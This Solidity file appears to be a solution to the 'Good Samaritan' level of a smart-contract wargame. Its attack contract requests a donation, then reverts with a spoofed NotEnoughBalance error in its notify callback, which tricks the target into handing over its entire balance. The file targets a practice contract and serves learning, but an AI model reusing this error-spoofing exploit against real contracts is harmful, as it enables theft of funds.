// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GoodSamaritan.sol";
error NotEnoughBalance();
contract GoodSamaritanAttack{
    GoodSamaritan public go;
    function att(address att) public {
        go = GoodSamaritan(att);
        go.requestDonation();
    }
    function notify(uint256 amount_) public {
        if(amount_ <= 10) {
            revert NotEnoughBalance();
        }
    }
}